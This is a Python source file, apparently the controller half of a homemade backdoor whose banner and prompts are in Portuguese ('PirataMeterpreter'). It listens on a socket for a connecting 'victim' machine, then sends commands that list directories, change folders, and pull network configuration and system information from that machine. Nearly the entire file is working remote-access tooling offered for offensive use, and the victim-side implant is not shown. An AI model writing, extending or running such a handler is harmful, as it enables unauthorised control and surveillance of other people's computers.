
import socket
import os, base64

IP = "192.168.100.9"
PORT = 2

if 1 == 1:
    try:
        os.system("clear")
        os.system("cls")
    except:
        os.system("cls")
else:
    print("WTF!?")
print("")
print("  [+] MEU PRÓPRIO BACKDOOR - DEFAULTCRYPTER")
print("""
    ██████╗ ██╗██████╗  █████╗ ████████╗ █████╗ 
    ██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗
    ██████╔╝██║██████╔╝███████║   ██║   ███████║
    ██╔═══╝ ██║██╔══██╗██╔══██║   ██║   ██╔══██║
    ██║     ██║██║  ██║██║  ██║   ██║   ██║  ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
        (defaultcrypter - backdoor python)                        

""")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP, PORT))
print("Servidor Criado! no IP: "+IP+" na PORTA:",PORT)
s.listen(5)
print("Aguardando por conexões...")
conn, client = s.accept()
print("")
print(" [+] Nova sessão, Vitima IP:",client[0],"na PORTA:",client[1])
print("    command >> help - para mostrar as opções")
print("")

while True:
    command = str(input(" ~PirataMeterpreter >> "))
    command = command.encode()
    conn.send(command)
    command = command.decode()

    if command == "pwd":
        pwdfile = conn.recv(2048)
        pwdfile = pwdfile.decode()
        print("")
        print(" [-] diretorio: "+pwdfile)
        print("")

    elif command == "dir":
        dirx40ha = conn.recv(30000)
        dirx40ha = dirx40ha.decode()
        print(dirx40ha)

    elif command == "ipconfig":
        ipconf = conn.recv(40000)
        ipconf = str(ipconf)
        ipconf = ipconf.decode()
        print(ipconf)

    elif command == "info":
        infoencode = conn.recv(3000)
        infoencode = infoencode.decode()
        print("")
        print(infoencode)
        print("")

    elif command == "cd":
        cdlocal = str(input(" local: "))
        cdlocal = cdlocal.encode()
        conn.send(cdlocal)
    
    elif command == "dirchange":
        print("Cole o local do diretorio: ")
        locald = str(input(" Caminho >> "))
        locald = str(locald)
        locald = locald.encode()
        conn.send(locald)

    elif command == "help":
        print("""
        
    Comandos Para executar na Maquina da Vitima:

        [+]: pwd - printa o diretorio atual da vitima

        [+]: dir - lista as pasta/arquivos que contém dentro do diretorio atual

        [+]: ipconfig - printa todas as configurações e dados de rede da vitima

        [+]: info - lista as informações do sistema!

        [+]: cd .. - volta um diretorio anterior

        [+]: cd - digitando apenas cd, você poderá escolher em que pasta você quer interagir

        [+]: dirchange - muda para um diretório diferente exemplo ~ "c:\\Users\\anonymous\\"

        [+]: clear - limpa a tela

        """)

    elif command == "clear":
        if 1 == 1:
            try:
                os.system("clear")
                os.system("cls")
            except:
                os.system("cls")
        else:
            print("WTF!?")
    else:
        print("Error!")